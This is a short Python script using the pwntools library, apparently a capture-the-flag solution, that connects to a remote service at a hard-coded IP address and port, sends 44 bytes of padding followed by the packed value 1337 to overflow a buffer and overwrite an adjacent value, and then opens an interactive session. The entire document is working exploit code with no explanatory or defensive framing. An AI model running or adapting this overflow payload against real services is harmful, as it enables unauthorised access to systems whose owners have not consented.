from pwn import *


r = remote('143.198.184.186', 5000)
print(r.recv())
offset = b"A"*44
offset += p64(1337)
r.send(offset)
r.interactive()
